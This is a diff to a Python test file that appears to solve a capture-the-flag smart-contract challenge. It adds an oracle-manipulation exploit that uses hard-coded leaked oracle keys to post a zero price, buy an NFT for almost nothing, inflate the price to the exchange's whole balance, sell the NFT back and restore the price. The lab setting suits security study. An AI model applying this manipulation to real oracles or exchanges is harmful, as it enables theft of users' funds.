@@ -78,6 +78,26 @@ def test_compromised_challenge(contracts):
     privateKey2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
     source2 = accounts.add(privateKey2)
 
-    
+    # Update Oracle price to zero such that median price is zero
+    contracts['oracle'].postPrice("DVNFT", 0, {"from":source1})
+    contracts['oracle'].postPrice("DVNFT", 0, {"from":source2})
+
+    # Buy a NFT at median price 0
+    tx = contracts['exchange'].buyOne({"from":attacker, "value": 1 })
+    id = tx.return_value
+
+    # Update Oracle price to EXCHANGE_INITIAL_ETH_BALANCE  (9990 ETH)
+    # such that median price is 9990 ETH
+    contracts['oracle'].postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE , {"from":source1})
+    contracts['oracle'].postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE , {"from":source2})
+
+    # sell NFT for the High price set of 9990 ETH
+    contracts['nftToken'].approve(contracts['exchange'].address, id, {"from":attacker}) 
+    contracts['exchange'].sellOne(id, {"from":attacker})
+
+    # Update Oracle price back to 999 ETH
+    contracts['oracle'].postPrice("DVNFT", INITIAL_NFT_PRICE, {"from": source1})
+    contracts['oracle'].postPrice("DVNFT", INITIAL_NFT_PRICE, {"from": source2})
+
     #_________________________________#
 
